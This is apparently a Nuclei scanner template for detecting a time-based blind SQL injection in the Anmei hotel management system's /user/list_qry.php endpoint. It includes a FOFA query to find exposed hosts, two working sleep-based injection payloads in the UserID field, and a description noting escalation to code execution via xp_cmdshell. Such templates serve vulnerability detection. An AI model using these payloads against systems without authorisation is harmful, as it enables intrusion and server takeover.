id: anmeijiudian-list_qry_php-sql-time

info:
  name: "安美酒店管理系统 接口SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: title="酒店宽带运营系统"
      安美酒店管理系统在/list_qry.php接口中存在SQL注入漏洞。攻击者可利用该漏洞执行任意SQL语句，通过调用xpcmdshell组件实现后门文件写入及任意代码执行，最终控制目标服务器。该缺陷允许未经授权的远程攻击者绕过常规验证机制，直接操作数据库并获取系统最高权限。
  reference:
  - https://mp.weixin.qq.com/s/r-iq5E6LZNwAE3vARMLs0w
  tags: 安美酒店管理系统


http:
- raw:
  - |
    POST /user/list_qry.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
    Content-Type: application/x-www-form-urlencoded

    UserID=0'XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR'Z&starttime=2023-01-01&stoptime=2023-12-31
  - |
    POST /user/list_qry.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
    Content-Type: application/x-www-form-urlencoded

    UserID=0'XOR(if(now()=sysdate()%2Csleep(8)%2C0))XOR'Z&starttime=2023-01-01&stoptime=2023-12-31
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
